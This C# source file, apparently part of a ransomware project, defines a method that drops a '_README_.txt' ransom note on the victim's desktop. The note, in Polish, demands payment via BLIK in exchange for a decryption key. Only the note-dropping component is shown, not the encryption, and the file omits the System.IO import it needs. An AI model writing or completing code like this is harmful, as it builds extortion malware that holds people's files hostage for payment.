using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace WinFormsApp1
{
     class DesktopNote
    {
        public static void dropDesktopNote() {
            string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

            // Define the file name and path
            string filePath = Path.Combine(desktopPath, "_README_.txt");

            // Define the content to write to the file
            string content = "Hello,Dawaj kase blikiem to ci dam klucz do odszyfrowania. elo";
            if (File.Exists(filePath)) {
                Console.WriteLine("File already exists");
            }
            else
            {
                try
                {
                    // Write the content to the file
                    File.WriteAllText(filePath, content);

                    // Notify the user
                    Console.WriteLine("File created successfully at " + filePath);
                }
                catch (Exception ex)
                {
                    // Handle any errors that might occur during the file creation process
                    Console.WriteLine("An error occurred: " + ex.Message);
                }
            }
        }

    }
}
